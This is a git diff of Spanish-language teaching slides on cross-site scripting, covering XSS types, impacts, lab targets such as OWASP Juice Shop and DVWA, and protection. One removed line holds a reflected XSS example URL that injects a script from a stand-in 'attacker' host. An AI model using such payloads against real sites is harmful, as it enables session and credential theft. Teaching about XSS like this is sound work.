@@ -42,40 +42,75 @@
 				</section>
 				<style>
 					.line { display: block; }
-					.line.focus { background: yellow; }
+					.line.focus { background: #ff362f; }
 				</style>
 				<section>
   <pre><code data-trim>
-  1. XSS
-  alert('hi');
+XSS
+├── ¿Qué es la XSS?
+├── Tipos de XSS
+│   ├── Persistente
+│   ├── No Persistente
+│   ├── DOM
+│   ├── DOM
+│	└── Blind
+├── Ejemplos
+├── Entorno Controlado
+└── ¿Cómo protegerse?
   </code></pre>
-					<p class="fragment" data-code-focus="1">
+					<p class="fragment" data-code-focus="2">
+						¿Qué explota?
+					</p>
+					<p class="fragment" data-code-focus="3-6">
+						Ejemplos de cada uno.
+					</p>
+					<p class="fragment" data-code-focus="7">
 						Hablar de ....
 					</p>
-					<p class="fragment" data-code-focus="1-2">
-						Hablar de ....
+					<p class="fragment" data-code-focus="8">
+						OWASP Juice Shop Project | DVWA
+					</p>
+					<p class="fragment" data-code-focus="9">
+						Codigo, Base de Datos, Server
 					</p>
 				</section>
 
 				<section>
-					<h1>¿Qué es la XSS?</h1>
+					<section>
+						<h1>¿Qué es XSS?</h1>
+						<ul>
+							<li>Inyección secuencias de comandos malintencionadas en sitios web (VBScript, JavaScript)</li>
+							<li>Explotan la confianza que un usuario tiene en un sitio en particular.</li>
+							<li>Ocurren cuando un atacante usa una aplicación web para enviar código malicioso a un usuario final diferente. </li>
+						</ul>
+					</section>
+
+					<section>
+						<img data-src="https://ciberseguridad.digital/wp-content/uploads/2016/12/Diagram-Describing-Blind-XSS-Attack.gif" alt="" data-background-color="#ff362f">
+					</section>
 				</section>
 
 				<section>
-					<h1>¿Para qué sirve?</h1>
+					<h1>Impactos</h1>
+					<ul>
+						<li>Robo de credenciales (password sin encriptar).</li>
+						<li>Robo de sesiones (cookies).</li>
+						<li>Enviar malware a la víctima.</li>
+						<li>Robo de información de otros sitios (Google, Facebook, Twitter, etc..).</li>
+					</ul>
 				</section>
 
 				<section>
-					<h1>Tipos de XSS</h1>
-					<p class="fragment fade-up">XSS Reflected (No persistente)</p>
-					<p class="fragment fade-up">XSS Stored (Persistente)</p>
+					<section>
+						<h1>Tipos de XSS</h1>
+						<p class="fragment fade-up">Reflected XSS (No persistente)</p>
+						<p class="fragment fade-up">Stored XSS (Persistente)</p>
+						<p class="fragment fade-up">DOM XSS (Persistente)</p>
+						<p class="fragment fade-up">Blind XSS (Persistente)</p>
+					</section>
 					<section>
 						<h2>XSS No persistente</h2>
-						<pre>
-							<code class="hljs" data-trim contenteditable>
-								http://example/?var=<SCRIPT%20a=”>”%20SRC=”http://attacker/xss.js”>&lt;/SCRIPT>
-							</code>
-						</pre>
+						<p></p>
 					</section>
 					<section>
 						<h2>XSS persistente</h2>
@@ -87,6 +122,20 @@
 							</lu>
 						</p>
 					</section>
+					<section>
+						<h2>XSS DOM</h2>
+						<p>
+							<lu>
+								<li>CSRF</li>
+								<li>Blind</li>
+								<li>DOM</li>
+							</lu>
+						</p>
+					</section>
+					<section>
+						<h2>XSS Blind</h2>
+						<img data-src="images/Diagram-Describing-Blind-XSS-Attack.gif" alt="">
+					</section>
 				</section>
 
 				<section data-background-image="images/slider-red.jpg" data-background-transition="zoom">
@@ -95,7 +144,7 @@
 					</section>
 					<section>
 						<button></button>
-						<iframe data-src="http://172.19.18.72/" height="1000" width="800">
+						<iframe data-src="http://172.19.18.75/" height="1000" width="800">
 						</iframe>
 					</section>
 				</section>
@@ -104,10 +153,22 @@
 					<h1>Entorno controlado</h1>
 				</section>
 
-				<section data-background-image="images/slider-blue.jpg" data-background-transition="zoom">¿Cómo protegerse? </section>
+				<section data-background-image="images/slider-blue.jpg" data-background-transition="zoom">
+					<h1></h1>¿Cómo protegerse?
+				</section>
+
 				<section>
 					<h3>Ejemplo Real</h3>
 					<iframe src="http://localhost:8000/" width="1400" height="800"></iframe>
+				</section>
+
+				<section>
+					<h3>Referencias</h3>
+					<ul>
+						<li>[1]. <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/xss.html?fbclid=IwAR1-bScJnluo6IQi7bOYZJ8eUn2gfAvzisKKl2yFB-86kxa40elo9mlQyso">pwning-owasp-juice-shop</a></li>
+						<li>[2]. <a href="https://ciberseguridad.digital/cross-site-scripting-xss/">Imagen de XSS</a></li>
+						<li>[2]. <a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29?fbclid=IwAR21o8cQCFpF8k87bRbEqZcEeWNwxfWu0ishvfkZ6YUH4qA4R4M8tJlH5NY">OWASP</a></li>
+					</ul>
 				</section>
 
 			</div>
